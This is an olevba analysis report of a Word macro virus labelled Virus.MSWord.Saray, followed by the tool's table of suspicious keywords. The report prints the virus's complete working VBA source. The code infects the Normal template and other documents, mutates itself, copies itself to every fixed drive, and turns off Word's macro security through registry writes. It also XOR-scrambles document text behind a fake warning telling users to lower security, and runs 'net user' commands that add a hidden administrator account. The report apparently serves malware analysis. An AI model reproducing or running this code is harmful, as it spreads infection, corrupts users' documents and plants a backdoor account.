olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Saray-0d8dad4d1634c97dfe1145ddf9c654dee20c71ca
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Saray-0d8dad4d1634c97dfe1145ddf9c654dee20c71ca - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WinMD.bas 
in file: Virus.MSWord.Saray-0d8dad4d1634c97dfe1145ddf9c654dee20c71ca - OLE stream: 'Macros/VBA/WinMD'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub spread()
On Error Resume Next
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set dc = fs.Drives
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
    For Each d In dc
        If d.DriveType = 3 Then
            Path = d.driveletter
            If fs.folderexists(Path + ":\xxx") = False Then
                fs.createfolder (Path + ":\xxx")
                fs.copyfile ActiveDocument.FullName, Path + ":\xxx\xxx.doc"
            End If
        End If
    Next
End Sub
Private Sub WinMD()
On Error GoTo allinfected
stealth
infectnt = True
INFECTAD = True
For I = 1 To NormalTemplate.VBProject.vbcomponents.Count
If NormalTemplate.VBProject.vbcomponents.Item(I).Name = "WinMD" Then infectnt = False
Next
For I = 1 To ActiveDocument.VBProject.vbcomponents.Count
If ActiveDocument.VBProject.vbcomponents.Item(I).Name = "WinMD" Then INFECTAD = False
Next
If infectnt = True Then
    ActiveDocument.VBProject.vbcomponents("WinMD").Export ("c:\winmd.vxd")
    Set victim = NormalTemplate.VBProject
End If
If INFECTAD = True Then
    NormalTemplate.VBProject.vbcomponents("WinMD").Export ("c:\winmd.vxd")
    Set victim = ActiveDocument.VBProject
End If
If INFECTAD = False And infectnt = False Then GoTo allinfected
m0rph
If INFECTAD = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
victim.vbcomponents.import ("c:\winmd2.vxd")
Kill "c:\winmd.vxd"
Kill "c:\winmd2.vxd"
If INFECTAD = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
If infectnt = True Then NormalTemplate.Save
allinfected:
On Error Resume Next
Kill "c:\winmd.vxd"
Kill "c:\winmd2.vxd"
End Sub
Sub autoopen()
On Error Resume Next
WinMD
encode (0)
spread
End Sub
Sub filesave()
On Error Resume Next
If (InStr(1, ActiveDocument.FullName, "Document", vbTextCompare) <> 1) And (InStr(1, ActiveDocument.FullName, "Äîêóìåíò", vbTextCompare) <> 1) Then
    WinMD
    If ActiveDocument.Paragraphs.Count < 250 Then encode (1)
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
    encode (0)
    ActiveDocument.Saved = True
Else
    filesaveas
End If
End Sub
Sub filesaveas()
On Error Resume Next
WinMD
Dialogs(wdDialogFileSaveAs).Show
If ActiveDocument.Paragraphs.Count < 250 Then encode (1)
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
encode (0)
ActiveDocument.Saved = True
End Sub
Sub fileprint()
On Error Resume Next
trigger
Dialogs(wdDialogFilePrint).Show
End Sub
Sub fileclose()
On Error GoTo ro
If ActiveDocument.Saved = True Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
    WinMD
    If ActiveDocument.Paragraphs.Count < 250 Then encode (1)
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
    ActiveDocument.Close savechanges:=wdDoNotSaveChanges
Else
   mess$ = "Save changes before exitting?"
   mess$ = "Ñîõðàíèòü èçìåíåíèÿ â äîêóìåíòå " + ActiveDocument.FullName + "?"
   resp = MsgBox(mess$, vbYesNoCancel + vbExclamation, "Microsoft Word")
   If resp = vbYes Then filesave
   If resp = vbNo Then ActiveDocument.Saved = True
   If resp <> vbCancel Then ActiveDocument.Close savechanges:=wdDoNotSaveChanges
End If
    
ro:
End Sub
Private Sub stealth()
On Error Resume Next
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Application.ScreenUpdating = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Security", "Level") = 1& 'WinMD
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1& 'WinMD
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1& 'WinMD
For I = CommandBars("tools").Controls.Count - 1 To CommandBars("tools").Controls.Count - 100
    CommandBars("tools").Controls.Item(I).Enabled = False
Next I
CommandBars("Format").Controls.Item(CommandBars("Format").Controls.Count - 2).Enabled = False
End Sub
Sub toolsmacro()
End Sub
Sub viewvbcode()
End Sub
Function scramble(str)
On Error Resume Next
'If (InStr(1, str, "Sub", 0) = 0) And (InStr(1, str, "Function", 0) = 0) And (InStr(1, str, "WinMD", 1) = 0) And (InStr(1, str, "Âíèìà", 1) = 0) And (InStr(1, str, "Æéìèä", 1) = 0) Then
'    AR = Split(str, " ", -1, 1)
'        For I = 1 To UBound(AR)
'            If (2 * Rnd) < 1 Then
'                AR(I) = LCase(AR(I))
'            Else
'                AR(I) = UCase(AR(I))
'            End If
'        Next
'    scramble = Join(AR, " ")
'Else
    scramble = str
'End If
End Function
Private Sub m0rph()
On Error Resume Next
Dim I, SARRAY(50) As String
Open "c:\winmd.vxd" For Input As #1
Open "c:\winmd2.vxd" For Output As #2
Line Input #1, s$
If s$ <> "" Then Print #2, scramble(s$)
I = 1
Line Input #1, SARRAY(I)
Do
I = I + 1
Line Input #1, SARRAY(I)
Loop Until ((SARRAY(I) = "Sub autoopen()") Or (SARRAY(I) = "Function scrabmle(str)") Or (SARRAY(I) = "Private Sub WinMD()") Or (SARRAY(I) = "Private Sub m0rph()") Or (SARRAY(I) = "Sub filesave()") Or (SARRAY(I) = "Private Sub stealth()") Or (SARRAY(I) = "Private Sub trigger()") Or (SARRAY(I) = "Private Sub encode(diri)") Or (SARRAY(I) = "Sub autoclose") Or (SARRAY(I) = "Sub filesaveas()") Or (SARRAY(I) = "Sub fileprint()") Or (SARRAY(I) = "Private Sub spread()") Or (SARRAY(I) = "Sub viewvbcode()") Or (SARRAY(I) = "Sub toolsmacro()"))
s$ = SARRAY(I)
I = I - 1
Do
If s$ <> "" Then Print #2, scramble(s$)
Line Input #1, s$
Loop Until s$ = "'WinMD"
For C = 0 To I
If SARRAY(C) <> "" Then Print #2, scramble(SARRAY(C))
Next
If s$ <> "" Then Print #2, scramble(s$)
Close #2
Close #1
End Sub
Private Sub trigger()
On Error Resume Next
Randomize
    If ((ActiveDocument.Paragraphs.Count > 10) And (Left(ActiveDocument.Paragraphs(1).Range.Text, 5) <> "  .  ")) And (Rnd * 10 < 4) Then
        Randomize
        I = Int((ActiveDocument.Paragraphs.Count - 1) * Rnd) + 1
        ActiveDocument.Paragraphs(I).Range.Text = Left(ActiveDocument.Paragraphs(I).Range.Text, Len(ActiveDocument.Paragraphs(I).Range.Text) - 1) & " ([WinMD] rulezzz...)" & Chr(10)
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
    End If
    If System.OperatingSystem = "Windows NT" Then 'WinMD
        Shell ("net user WinMD /add")
        If Application.Language = msoLanguageIDRussian Then
            Shell ("net localgroup Àäìèíèñòðàòîðû WinMD /add")
        Else
            Shell ("net localgroup Administrators WinMD /add")
        End If
    End If
End Sub
Private Sub encode(diri)
On Error Resume Next
If (diri = 1) Or ((diri = 0) And ((Left(ActiveDocument.Paragraphs(1).Range.Text, 7) = "  Âíèìà") Or (Left(ActiveDocument.Paragraphs(1).Range.Text, 7) = "  Warni"))) Then
  L = ActiveDocument.Paragraphs.Count
  For n = 1 To L
    OLD = Left(ActiveDocument.Paragraphs(n).Range.Text, Len(ActiveDocument.Paragraphs(n).Range.Text) - 1)
    L = Len(OLD)
    newtext = ""
    For I = 1 To L
        char = Asc(Mid(OLD, I, L))
        newchar = char Xor 4
        newtext = newtext & Chr(newchar)
    Next I
    If (n < L) Then ActiveDocument.Paragraphs(n).Range.Text = newtext + Chr(10)
  Next n
End If
If (diri = 1) Then
    'If Application.Language = msoLanguageIDRussian Then
        ActiveDocument.Paragraphs(1).Range.Text = "  Âíèìàíèå! Íå óäàëîñü çàïóñòèòü ìàêðîñ îòâå÷àþùèé çà êîäèðîâêó òåêñòà! Òåêñò ìîæåò îòîáðàæàòüñÿ íåïðàâèëüíî. Ïðîâåðüòå, ÷òî â ìåíþ Ñåðâèñ | Ìàêðîñ | Áåçîïàñíîñòü óñòàíîâëåí ñðåäíèé óðîâåíü áåçîïàñíîñòè" + Chr(10) + ActiveDocument.Paragraphs(1).Range.Text
    'Else
    '    ActiveDocument.Paragraphs(1).Range.Text = "  Warning! At least one macro from this document can't be loaded. Text can't be displayed properly. Try to set medium security level in Tools | Macro | Security... " + Chr(10) + ActiveDocument.Paragraphs(1).Range.Text 'WinMD
    'End If
End If
If (diri = 0) And ((Left(ActiveDocument.Paragraphs(1).Range.Text, 7) = "$$Æéìèä") Or (Left(ActiveDocument.Paragraphs(1).Range.Text, 7) = "$$Sevjm")) Then ActiveDocument.Paragraphs(1).Range.Text = ""
End Sub
'WinMD
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|copyfile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

